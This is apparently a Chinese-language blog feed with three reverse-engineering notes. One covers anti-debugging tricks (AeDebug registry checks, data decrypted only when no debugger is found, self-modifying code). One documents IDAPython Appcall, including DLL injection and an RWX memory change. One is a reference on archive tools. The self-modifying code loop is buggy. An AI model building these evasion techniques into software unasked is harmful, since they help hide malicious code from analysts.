<code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug</code>
64位系统:
<code>SOFTWARE\Wow6432Node\Microsoft\WindowsNT\CurrentVersion\AeDebug</code>
该注册表项指定当应用程序发生错误时，触发哪一个调试器。默认情况下，它被设置为<code>Dr.Watson</code>。如果该这册表的键值被修改为<code>OllyDbg</code>
或是其他调试器名，则代码就可以确定它正在被调试。</p>
<h1 id="对数据加密">对数据加密</h1>
<p>在程序开始前，不将正确的数据显露出来</p>
<p>当用以上技术<strong>并未</strong>检测到程序正在调试时，再将相应的数据进行解密</p>
<p>可结合 TLS 回调函数等技术</p>
<p>以下代码仅供参考：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> secret[<span class="number">256</span>] = &#123; <span class="number">0x54</span>, <span class="number">0x65</span>, <span class="number">0x6a</span>, <span class="number">0x7f</span>, <span class="number">0x65</span>, <span class="number">0x4f</span>, <span class="number">0x21</span>, <span class="number">0x63</span>, <span class="number">0x4f</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x7e</span>, <span class="number">0x74</span>, <span class="number">0x63</span>, <span class="number">0x20</span>, <span class="number">0x7d</span>, <span class="number">0x75</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">IsDebuggerPresent</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">memcpy</span>(secret, <span class="string">&quot;hacker!&quot;</span>, <span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			secret[i] ^= <span class="number">0x10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line">	<span class="built_in">puts</span>(secret);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="自修改代码">自修改代码</h1>
<p>将想要加密的 <code>.text</code> 代码区段进行加密</p>
<blockquote>
<p>注意，需要使用 <code>PE Editor</code> 等软件将软件的
<code>.text</code> 代码区段改为可写</p>
</blockquote>
<p>当程序运行时再进行解密，可以在一定程度上反动态调试</p>
<p>可结合 TLS 回调函数等技术</p>
<p>以下代码仅供参考：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">functionA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">functionB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">IsDebuggerPresent</span>())</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		LPBYTE start = (LPBYTE)functionA;</span><br><span class="line">		LPBYTE end = (LPBYTE)functionB;</span><br><span class="line">		<span class="keyword">while</span> (start != end)</span><br><span class="line">		&#123;</span><br><span class="line">			*start ^= <span class="number">0x66</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line">	<span class="built_in">functionA</span>();</span><br><span class="line">	<span class="built_in">functionB</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="攻击调试器漏洞">攻击调试器漏洞</h1>
<p>与所有软件一样，调试器也存在漏洞，有时恶意代码编写者为了防止被调试，会攻击这些漏洞。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>anti-debug</tag>
        <tag>debug</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>Appcall类笔记</title>
    <url>//appcall-note.html</url>
    <content><![CDATA[<h1 id="appcall-简述">Appcall 简述</h1>
<p>Appcall
可以帮助我们在调试对象的上下文（过程中）调用某些函数，这在一些情况下是十分有用的，比如说：</p>
<ul>
<li>标识为加密函数的函数：加密/解密/散列函数</li>
<li>显式调用不那么常用的函数：与其等待程序调用某个函数，不如直接调用</li>
<li>改变程序逻辑：通过调用某些被调试函数，可以改变程序的逻辑和内部状态</li>
<li>扩展你的程序：因为 Appcall
可以在条件断点的条件表达式中使用，所以可以通过这种方式扩展应用程序</li>
<li>Fuzzing 应用程序：在功能级别轻松地对程序进行模糊测试</li>
<li>...</li>
</ul>
<h1 id="appcall-的工作原理">Appcall 的工作原理</h1>
<p>给定一个具有正确原型的函数，Appcall 机制的工作方式如下：</p>
<ol type="1">
<li>保存当前线程上下文</li>
<li>序列化参数（我们不为参数分配内存，我们使用被调试者的堆栈）</li>
<li>修改有问题的输入寄存器</li>
<li>将指令指针设置为要调用的函数的开头</li>
<li>调整返回地址，使其指向我们有断点的特殊区域（我们将其称为<strong>控制断点</strong>）</li>
<li>恢复程序并等待直到我们得到一个异常或控制断点（在上一步中插入）</li>
<li>反序列化回输入（仅适用于通过引用传递的参数）并保存返回值</li>
</ol>
<p>在手动 Appcall
的情况下，调试器模块将完成除最后两个步骤之外的所有步骤，从而使我们有机会以交互方式调试相关功能。</p>
<h1 id="appcall-的使用">Appcall 的使用</h1>
<p>根据 Appcall 的工作原理，我们可以知道要使用 Appcall 模块，首先需要让
IDA 的调试器在运行中，即调试你目前正在逆向的程序。</p>
<p>之后便可以通过 Appcall 提供的 api 来做我们想做的事情。</p>
<blockquote>
<p>需要注意，Appcall 类在 <code>ida_idd</code> 模块中，不过 ida python
默认 import 该模块。</p>
</blockquote>
<h2 id="class-appcall"><code>class Appcall</code></h2>
<h3 id="appcall.utf16s"><code>Appcall.UTF16(s)</code></h3>
<p>接收一个字符串 <code>s</code>，将其转化为 UTF16 的字节流
(<code>bytes</code>)</p>
<h3 id="appcall.arraytype_name"><code>Appcall.array(type_name)</code></h3>
<p>创建数组类型，但需要指定一个类型名字。</p>
<p>返回值将是一个 <code>array</code> 对象。</p>
<p>需要通过 <code>pack()</code> 和 <code>unpack()</code>
来对这个数组对象操作。</p>
<h3 id="appcall.bufferstrnone-size0-fillx00"><code>Appcall.buffer(str=None, size=0, fill='\x00')</code></h3>
<p>创建一个字符串缓冲区，通常是作为可变字符串数组使用（引用传递）。</p>
<p>接受一个字符串 <code>str</code>，一个缓冲区长度
<code>size</code>，一个初始化元素 <code>fill</code>。</p>
<p>如果不指定字符串，默认为空字符串；如果不指定缓冲区长度，默认字符串长度；如果不指定初始化填充元素，则默认为
<code>\x00</code>。</p>
<p>返回值将是一个 <code>byref</code> 对象。</p>
<p>可以使用 <code>byref.value</code> 获取缓冲区内的字符串内容
(<code>str</code>)。</p>
<p>可以使用 <code>byref.size</code> 获取缓冲区大小
(<code>int</code>)。</p>
<h3 id="appcall.byrefval"><code>Appcall.byref(val)</code></h3>
<p>创建一个不可变对象的引用，目前只支持 <code>int</code> 和
<code>str</code>
的引用类型，通常是作为不可变字符串数组使用（非引用传递）。</p>
<p>可以使用 <code>byref.value</code> 获取缓冲区内的字符串内容
(<code>int / str</code>)。</p>
<h3 id="appcall.cleanup_appcalltid0"><code>Appcall.cleanup_appcall(tid=0)</code></h3>
<p>与 IDC 的 <code>CleanupAppcall()</code>
同理，作为还原上下文所用的函数。</p>
<h3 id="appcall.int64val"><code>Appcall.int64(val)</code></h3>
<p>创建一个 <code>int64</code> 对象，通常作为传递参数时使用。</p>
<p>接收一个 <code>int</code> 初始值 <code>val</code>。</p>
<h3 id="appcall.objkwds"><code>Appcall.obj(**kwds)</code></h3>
<p>创建一个空对象，或者存在关键字参数的属性的对象。</p>
<h3 id="appcall.protoname_or_ea-proto_or_tinfo-flagsnone"><code>Appcall.proto(name_or_ea, proto_or_tinfo, flags=None)</code></h3>
<p>将所需要的原型实例化为 <code>appcall</code> (<code>callable</code>
对象)。</p>
<ul>
<li><code>name_or_ea</code> → 函数名字符串或者函数地址（函数名将使用
<code>LocByName()</code> 解析）</li>
<li><code>proto_or_tinfo</code> → 函数原型字符串或者函数类型的
<code>tinfo_t</code> 对象（可以使用 <code>get_tinfo()</code>
函数获取）</li>
</ul>
<p>失败时，无法解析原型或者地址将会抛出异常；</p>
<p>成功时将会返回 <code>callable</code> 对象。</p>
<h3 id="appcall.typeobjtypedecl_or_tinfo-eanone"><code>Appcall.typeobj(typedecl_or_tinfo, ea=None)</code></h3>
<p>返回一个类型的 Appcall 对象，可以传入 <code>tinfo_t</code>
对象来获取。</p>
<p>获取失败将会抛出 <code>ValueError</code> 异常。</p>
<h3 id="appcall.unicodes"><code>Appcall.unicode(s)</code></h3>
<p>接收一个字符串 <code>s</code>，将其转化为 Unicode 的字节流
(<code>bytes</code>)。</p>
<h3 id="appcall.valueofname-default0"><code>Appcall.valueof(name, default=0)</code></h3>
<p>返回给定名称字符串 <code>name</code> 的数值。</p>
<p>如果名称无法解析，则返回默认值 <code>default</code> 。</p>
<h3 id="appcall.consts"><code>Appcall.Consts</code></h3>
<p>实例变量，使用 <code>Appcall.Consts.CONST_NAME</code>
来访问常量，<code>CONST_NAME</code> 因程序的设定变化。</p>
<h3 id="appcall.function_name"><code>Appcall.FUNCTION_NAME</code></h3>
<p>实例变量，可以如此使用直接调用对应函数，例如存在函数
<code>int f(int x) &#123; return x + 5; &#125;</code></p>
<p>我们可以通过 <code>result = Appcall.f(5)</code>
来直接调用该函数。</p>
<h2 id="class-appcall_array__type_name"><code>class Appcall_array__(type_name)</code></h2>
<p>需要实例化的类，通过静态方法 <code>Appcall.array()</code> 获取。</p>
<h3 id="array.packl"><code>array.pack(L)</code></h3>
<p>将列表 (<code>list</code>) 或者元组 (<code>tuple</code>) 打包到
<code>byref</code> 缓冲区中。</p>
<h3 id="array.unpackbuf-as_listtrue"><code>array.unpack(buf, as_list=True)</code></h3>
<p>将数组解包回列表或对象，即存入 <code>buf</code> 对象中。</p>
<p><code>as_list</code> 如果为 <code>False</code>
则将数组作为元组解包。</p>
<h2 id="class-appcall_callable__"><code>class Appcall_callable__</code></h2>
<p>使用自然语法发出 <code>appcall</code> 的助手类：</p>
<p><code>appcall.FunctionNameInTheDatabase（参数，....）</code></p>
<p>要么</p>
<p><code>appcall["Function@8"](参数, ...)</code></p>
<p>要么</p>
<p><code>f8 = appcall["Function@8"] f8(arg1, arg2, ...)</code></p>
<p>要么</p>
<p><code>o = appcall.obj() i = byref(5) appcall.funcname(arg1, i, "hello", o)</code></p>
<p>使用给定函数 <code>ea</code> 初始化 <code>appcall</code></p>
<h3 id="appcall.ea"><code>appcall.ea</code></h3>
<p>实例变量，返回与此对象关联的函数地址 <code>ea</code></p>
<h3 id="appcall.fields"><code>appcall.fields</code></h3>
<p>实例变量，返回字段名</p>
<h3 id="appcall.size"><code>appcall.size</code></h3>
<p>实例变量，返回类型大小</p>
<h3 id="appcall.tif"><code>appcall.tif</code></h3>
<p>实例变量，返回 <code>tinfo_t</code> 对象</p>
<h3 id="appcall.type"><code>appcall.type</code></h3>
<p>实例变量，返回类型字符串</p>
<h2 id="class-appcall_consts__"><code>class Appcall_consts__</code></h2>
<p><code>Appcall.Consts</code>
是该类的实例化，专门用于通过属性访问检索常量。</p>
<p>比如说存在常量 <code>static const int Wow = 5;</code></p>
<p>那么我们可以通过 <code>Appcall.Consts.Wow</code> 来访问它。</p>
<blockquote>
<p>主要参考：<a href="https://www.hex-rays.com/products/ida/support/idapython_docs/ida_idd.html">https://www.hex-rays.com/products/ida/support/idapython_docs/ida_idd.html</a></p>
</blockquote>
<h1 id="appcall-使用实例">Appcall 使用实例</h1>
<h2 id="调用函数">调用函数</h2>
<p>比如说我们注意到存在一个解密函数：</p>
<figure>
<img src="/appcall-note/appcall_xdecrypt.gif" alt="静态分析结果">
<figcaption aria-hidden="true">静态分析结果</figcaption>
</figure>
<p>我们可以直接使用 IDA Python 调用该函数直接解密：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SizeOfBuffer = <span class="number">255</span></span><br><span class="line"><span class="comment"># 显式创建缓冲区为 byref 对象</span></span><br><span class="line">s_in = Appcall.byref(<span class="string">&quot;SomeEncryptedBuffer&quot;</span>) </span><br><span class="line"><span class="comment"># 缓冲区总是由引用返回</span></span><br><span class="line">s_out = Appcall.buffer(<span class="string">&quot;&quot;</span>, SizeOfBuffer) </span><br><span class="line"><span class="comment"># 调用被调试对象</span></span><br><span class="line">Appcall.decrypt_buffer(s_in, s_out, SizeOfBuffer) </span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;decrypted=&quot;</span>, s_out.value)</span><br></pre></td></tr></table></figure>
<h2 id="注入库">注入库</h2>
<p>要在调试对象中注入库，只需 <code>Appcall LoadLibrary()</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">loadlib = Appcall.proto(<span class="string">&quot;kernel32_LoadLibraryA&quot;</span>, <span class="string">&quot;int __stdcall loadlib(const char *fn);&quot;</span>) </span><br><span class="line">hmod = loadlib(<span class="string">&quot;dll_to_inject.dll&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="设置或获取最后一个错误">设置或获取最后一个错误</h2>
<p>要检索最后一个错误值，我们可以从 TIB 手动解析它，也可以调用
GetLastError() API：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">getlasterror = Appcall.proto(<span class="string">&quot;kernel32_GetLastError&quot;</span>, <span class="string">&quot;DWORD __stdcall GetLastError();&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;lasterror=&quot;</span>, getlasterror())</span><br></pre></td></tr></table></figure>
<p>同样，我们可以做同样的事情来设置最后一个错误代码值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">setlasterror = Appcall.proto(<span class="string">&quot;kernel32_SetLastError&quot;</span>, <span class="string">&quot;void __stdcall SetLastError(int dwErrCode);&quot;</span>) </span><br><span class="line">setlasterror(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<h2 id="检索命令行值">检索命令行值</h2>
<p>要检索程序的命令行，我们可以从 PEB 解析它，也可以调用
GetCommandLineA() API：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">getcmdline = Appcall.proto(<span class="string">&quot;kernel32_GetCommandLineA&quot;</span>, <span class="string">&quot;const char *__stdcall getcmdline();&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;command line:&quot;</span>, getcmdline())</span><br></pre></td></tr></table></figure>
<h2 id="设置重置事件">设置/重置事件</h2>
<p>有时，被调试的程序在等待信号量或事件时可能会死锁。您可以手动释放信号量或发出事件信号。
也可以杀死线程：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">releaseem = Appcall.proto(<span class="string">&quot;kernel32_ReleaseSemaphore&quot;</span>, </span><br><span class="line">  <span class="string">&quot;BOOL __stdcall ReleaseSemaphore(HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount);&quot;</span>) </span><br><span class="line">resetevent = Appcall.proto(<span class="string">&quot;kernel32_SetEvent&quot;</span>, </span><br><span class="line">  <span class="string">&quot;BOOL __stdcall SetEvent(HANDLE hEvent);&quot;</span>) </span><br><span class="line">termthread = Appcall.proto(<span class="string">&quot;kernel32_TerminateThread&quot;</span>, </span><br><span class="line">  <span class="string">&quot;BOOL __stdcall TerminateThread(HANDLE hThread, DWORD dwExitCode);&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="更改被调试者的虚拟内存配置">更改被调试者的虚拟内存配置</h3>
<p>可以更改内存页的保护。在下面的示例中，我们将 PE
头页保护更改为执行/读/写（通常是只读的）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">virtprot = Appcall.proto(<span class="string">&quot;kernel32_VirtualProtect&quot;</span>,</span><br><span class="line">  <span class="string">&quot;BOOL __stdcall VirtualProtect(LPVOID addr, DWORD sz, DWORD newprot, PDWORD oldprot);&quot;</span>)</span><br><span class="line">r = virtprot(<span class="number">0x400000</span>, <span class="number">0x1000</span>, Appcall.Consts.PAGE_EXECUTE_READWRITE, Appcall.byref(<span class="number">0</span>));</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;VirtualProtect returned:&quot;</span>, r)</span><br><span class="line">RefreshDebuggerMemory()</span><br></pre></td></tr></table></figure>
<p>如果你需要分配一个新的内存页：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">virtalloc = Appcall.proto(<span class="string">&quot;kernel32_VirtualAlloc&quot;</span>,</span><br><span class="line">  <span class="string">&quot;int __stdcall VirtualAlloc(int addr, SIZE_T sz, DWORD alloctype, DWORD protect);&quot;</span>)</span><br><span class="line">m = virtualalloc(<span class="number">0</span>, Appcall.Consts.MEM_COMMIT, <span class="number">0x1000</span>, Appcall.Consts.PAGE_EXECUTE_READWRITE)</span><br><span class="line">RefreshDebuggerMemory()</span><br></pre></td></tr></table></figure>
<h2 id="加载库并调用导出的函数">加载库并调用导出的函数</h2>
<p>使用 Appcall
还可以加载库、解析函数地址并调用它。让我们用一个例子来说明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_appdata</span>():</span><br><span class="line">    hshell32 = loadlib(<span class="string">&quot;shell32.dll&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> hshell32 == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;failed to load shell32.dll&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;%x: shell32 loaded&quot;</span> % hshell32</span><br><span class="line">    <span class="comment"># 确保刷新调试器内存加载新库后</span></span><br><span class="line">    RefreshDebuggerMemory()</span><br><span class="line">    <span class="comment"># 解析函数地址</span></span><br><span class="line">    p = getprocaddr(hshell32, <span class="string">&quot;SHGetSpecialFolderPathA&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> p == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;shell32.SHGetSpecialFolderPathA() not found!&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 创建原型</span></span><br><span class="line">    shgetspecialfolder = Appcall.proto(p,</span><br><span class="line">      <span class="string">&quot;BOOL SHGetSpecialFolderPath(HWND hwndOwner, LPSTR lpszPath, int nFolder, BOOL fCreate);&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;%x: SHGetSpecialFolderPath() resolved...&quot;</span></span><br><span class="line">    <span class="comment"># 创建缓冲区</span></span><br><span class="line">    buf = Appcall.buffer(<span class="string">&quot;\x00&quot;</span> * <span class="number">260</span>)</span><br><span class="line">    <span class="comment"># CSIDL_APPDATA  = 0x1A</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shgetspecialfolder(<span class="number">0</span>, buf, <span class="number">0x1A</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;SHGetSpecialFolderPath() failed!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;AppData Path: &gt;%s&lt;&quot;</span> % Appcall.cstr(buf.value)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>idapython</tag>
      </tags>
  </entry>
  <entry>
    <title>归档工具笔记</title>
    <url>//archiver-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>归档文件是由一个或多个计算机文件以及元数据组成的压缩文件。</p>
<p><strong>归档的特点</strong></p>
<ol type="1">
<li>数据压缩</li>
<li>加密</li>
<li>文件连接</li>
<li>自动提取</li>
<li>自动安装</li>
<li>源卷和媒体信息</li>
<li>文件跨越</li>
<li>校验和</li>
<li>目录结构信息</li>
<li>其他元数据（关于数据的数据）</li>
<li>错误发现</li>
</ol>
<p><strong>应用领域</strong></p>
<ol type="1">
<li>将计算机文件系统与元数据一起存储。</li>
<li>在本地传输文件有用。</li>
<li>用于通过网络传输文件。</li>
<li>软件包装应用。</li>
</ol>
<p>目的是使用时间换取空间。</p>
<p>目前来说，有很多种归档工具，下面只介绍我所见过的归档工具。</p>
<blockquote>
<p>仅是略写，更多详细的使用方式请使用相应工具的帮助功能
(<code>-h / -? / --help</code>)</p>
</blockquote>
<h1 id="ar">ar</h1>
<h2 id="简述-1">简述</h2>
<p><code>ar</code> 在 Linux 命令行中可以直接调用此工具。</p>
<p>可以使用 <code>binwalk</code> 软件提取。</p>
<h2 id="特征">特征</h2>
<p>文件开头含有 <code>!&lt;arch&gt;</code> 或者
<code>!&lt;thin&gt;</code> (这是一种简化的压缩)。</p>
<h2 id="命令">命令</h2>
<table>
<thead>
<tr class="header">
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>d</code></td>
<td>从归档文件中删除文件</td>
</tr>
<tr class="even">
<td><code>m[ab]</code></td>
<td>在归档文件中移动文件</td>
</tr>
<tr class="odd">
<td><code>p</code></td>
<td>打印在归档文件中找到的文件</td>
</tr>
<tr class="even">
<td><code>q[f]</code></td>
<td>将文件快速追加到归档文件中</td>
</tr>
<tr class="odd">
<td><code>r[ab][f][u]</code></td>
<td>替换归档文件中已有的文件或加入新文件</td>
</tr>
<tr class="even">
<td><code>s</code></td>
<td>act as ranlib</td>
</tr>
<tr class="odd">
<td><code>t</code></td>
<td>显示归档文件的内容</td>
</tr>
<tr class="even">
<td><code>x[o]</code></td>
<td>从归档文件中提取文件 (解压)</td>
</tr>
</tbody>
</table>
<h2 id="特定命令修饰符">特定命令修饰符</h2>
<table>
<thead>
<tr class="header">
<th>命令修饰符</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>[a]</code></td>
<td>将文件置于 [成员名] 之后</td>
</tr>
<tr class="even">
<td><code>[b]</code></td>
<td>将文件置于 [成员名] 之前 (于 <code>[i]</code> 相同)</td>
</tr>
<tr class="odd">
<td><code>[D]</code></td>
<td>use zero for timestamps and uids/gids</td>
</tr>
<tr class="even">
<td><code>[U]</code></td>
<td>use actual timestamps and uids/gids (default)</td>
</tr>
<tr class="odd">
<td><code>[N]</code></td>
<td>use instance <code>[count]</code> of name</td>
</tr>
<tr class="even">
<td><code>[f]</code></td>
<td>truncate inserted file names</td>
</tr>
<tr class="odd">
<td><code>[P]</code></td>
<td>在匹配时使用完整的路径名</td>
</tr>
<tr class="even">
<td><code>[o]</code></td>
<td>保留原来的日期</td>
</tr>
<tr class="odd">
<td><code>[u]</code></td>
<td>只替换比当前归档内容更新的文件</td>
</tr>
</tbody>
</table>
<h2 id="通用修饰符">通用修饰符</h2>
<table>
<thead>
<tr class="header">
<th>通用修饰符</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>[c]</code></td>
<td>不在必须创建库的时候给出警告</td>
</tr>
<tr class="even">
<td><code>[s]</code></td>
<td>创建归档索引 (cf. ranlib)</td>
</tr>
<tr class="odd">
<td><code>[S]</code></td>
<td>不要创建符号表</td>
</tr>
<tr class="even">
<td><code>[T]</code></td>
<td>make a thin archive</td>
</tr>
<tr class="odd">
<td><code>[v]</code></td>
<td>输出较多信息</td>
</tr>
<tr class="even">
<td><code>[V]</code></td>
<td>显示版本号</td>
</tr>
</tbody>
</table>
<h2 id="实例">实例</h2>
<ul>
<li><p>打包文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ar rv output.bak a.c b.c</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ar rv output.bak *.c</span><br></pre></td></tr></table></figure></li>
<li><p>显示打包文件内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ar t output.bak</span><br></pre></td></tr></table></figure></li>
<li><p>解压文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ar x output.bak</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="bzip2">bzip2</h1>
<h2 id="简述-2">简述</h2>
<p><code>bzip2</code> 是一个优秀的压缩算法，在 Linux 中经常被使用。</p>
<p>可以在 Linux 命令行中直接调用此工具。</p>
<p>可以使用 Bandizip 来解压缩。</p>
<h2 id="特征-1">特征</h2>
<p>后缀是 <code>.bz2</code></p>
<h2 id="命令-1">命令</h2>
<table>
<colgroup>
<col style="width: 6%">
<col style="width: 93%">
</colgroup>
<thead>
<tr class="header">
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-c</code></td>
<td>将压缩与解压缩的结果送到标准输出</td>
</tr>
<tr class="even">
<td><code>-d</code></td>
<td>执行解压缩</td>
</tr>
<tr class="odd">
<td><code>-f</code></td>
<td>bzip2在压缩或解压缩时，若输出文件与现有文件同名，预设不会覆盖现有文件。若要覆盖。请使用此参数</td>
</tr>
<tr class="even">
<td><code>-k</code></td>
<td>bzip2在压缩或解压缩后，会删除原始文件。若要保留原始文件，请使用此参数</td>
</tr>
<tr class="odd">
<td><code>-s</code></td>
<td>降低程序执行时内存的使用量</td>
</tr>
<tr class="even">
<td><code>-t</code></td>
<td>测试 <code>.bz2</code> 压缩文件的完整性</td>
</tr>
<tr class="odd">
<td><code>-v</code></td>
<td>压缩或解压缩文件时，显示详细的信息</td>
</tr>
<tr class="even">
<td><code>-z</code></td>
<td>强制执行压缩</td>
</tr>
<tr class="odd">
<td><code>-V</code></td>
<td>显示版本信息</td>
</tr>
<tr class="even">
<td><code>-#</code></td>
<td>指定压缩比；默认是6；数字越大压缩比越大（1-9）</td>
</tr>
</tbody>
</table>
<h2 id="实例-1">实例</h2>
<ul>
<li><p>压缩</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bzip2 filename</span><br></pre></td></tr></table></figure>
<p>压缩会将原来的文件删除，然后输出
<code>filename.bz2</code>，如果需要保留原文件请使用 <code>-k</code>
。</p></li>
<li><p>解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bzip2 -d filename</span><br></pre></td></tr></table></figure>
<p>解压会将压缩包删除，然后如果 <code>filename</code> 里有后缀
<code>.bz2</code>，则输出无后缀的文件；如果没有后缀，则输出同名文件。如果需要保留原文件请使用
<code>-k</code> 。</p></li>
</ul>
<h1 id="cpio">cpio</h1>
<h2 id="简述-3">简述</h2>
<p><code>cpio</code> 是用来建立，还原备份档的工具程序，它可以加入，解开
<code>cpio</code> 或 <code>tar</code> 备份档内的文件。</p>
<h2 id="特征-2">特征</h2>
<p>后缀是 <code>.cpio</code></p>
<h2 id="命令-2">命令</h2>
<table>
<thead>
<tr class="header">
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-o</code></td>
<td>指定运行为copy-out模式，即归档模式</td>
</tr>
<tr class="even">
<td><code>-i</code></td>
<td>指定运行为copy-in模式，即提取模式</td>
</tr>
<tr class="odd">
<td><code>-p</code></td>
<td>指定运行为copy-pass模式，即目录拷贝模式</td>
</tr>
<tr class="even">
<td><code>-t</code></td>
<td>列出归档文件中的文件列表</td>
</tr>
<tr class="odd">
<td><code>-d</code></td>
<td>当需要的时候自动创建目录</td>
</tr>
<tr class="even">
<td><code>-v</code></td>
<td>详细显示指令的执行过程</td>
</tr>
</tbody>
</table>
<h2 id="实例-2">实例</h2>
<ul>
<li><p>归档</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> | cpio -ov &gt; obj.cpio</span><br></pre></td></tr></table></figure>
<p>将当前目录的文件归档到 <code>obj.cpio</code> 中</p></li>
<li><p>提取</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cpio -idv &lt; obj.cpio</span><br></pre></td></tr></table></figure>
<p>提取归档文件 <code>obj.cpio</code></p></li>
</ul>
<h1 id="gzip">gzip</h1>
<h2 id="简述-4">简述</h2>
<p><code>gzip</code> 的是标准的，广泛使用的文件压缩和解压工具。
<code>gzip</code> 允许文件级联。</p>
<p>可以直接在 Linux 命令行中调用此工具。</p>
<p>可以使用 Bandizip 解压缩。</p>
<p>可以使用 <code>binwalk</code> 软件提取。</p>
<h2 id="特征-3">特征</h2>
<p>后缀为 <code>.gz</code></p>
<h2 id="命令-3">命令</h2>
<table>
<colgroup>
<col style="width: 6%">
<col style="width: 93%">
</colgroup>
<thead>
<tr class="header">
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-c</code></td>
<td>将输出写到标准输出上，并保留原有文件</td>
</tr>
<tr class="even">
